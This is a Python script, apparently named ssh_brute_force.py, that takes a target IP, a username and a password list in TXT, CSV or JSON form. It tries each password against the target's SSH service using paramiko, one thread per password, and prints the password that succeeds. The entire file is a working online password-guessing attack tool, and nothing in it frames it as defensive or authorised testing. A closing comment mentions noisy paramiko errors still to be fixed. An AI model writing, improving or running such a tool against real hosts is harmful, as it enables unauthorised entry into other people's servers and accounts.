import paramiko
import sys
import os
import csv
import json
import threading


def ssh_connect(target, username, password, result):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        result.append(password)
    except paramiko.AuthenticationException:
        pass
    except Exception:
        pass
    finally:
        ssh.close()


def load_passwords(password_file):
    _, file_extension = os.path.splitext(password_file)
    passwords = []

    try:
        if file_extension.lower() == '.txt':
            with open(password_file, 'r') as txt_file:
                passwords.extend(txt_file.read().splitlines())
        elif file_extension.lower() == '.csv':
            with open(password_file, 'r') as csv_file:
                csv_reader = csv.reader(csv_file)
                for row in csv_reader:
                    passwords.extend(row)
        elif file_extension.lower() == '.json':
            with open(password_file, 'r') as json_file:
                data = json.load(json_file)
                if isinstance(data, list):
                    passwords.extend(data)
                else:
                    print("Error: JSON data should be a list of passwords.")
        else:
            print("Error: Unsupported file format. Only TXT, CSV, and JSON files are supported.")
    except Exception:
        pass

    return passwords


def main():
    if len(sys.argv) != 4:
        print("Usage: python3 ssh_brute_force.py <target_ip> <username> <password_file> \n OR python ssh_brute_force.py <target_ip> <username> <password_file>")
        sys.exit(1)

    target = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    passwords = load_passwords(password_file)
    if not passwords:
        print("No passwords loaded. Exiting.")
        sys.exit(1)

    result = []
    threads = []
    for password in passwords:
        thread = threading.Thread(target=ssh_connect, args=(target, username, password, result))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if result:
        print("Password found:", result[0])
    else:
        print("Unfortunately, no password found. Try another list maybe.")


if __name__ == "__main__":
    main()

# there's something wrong with the output, 
# it shows the correct output but many errors connecte to paramiko before it
# TODO: fix this issue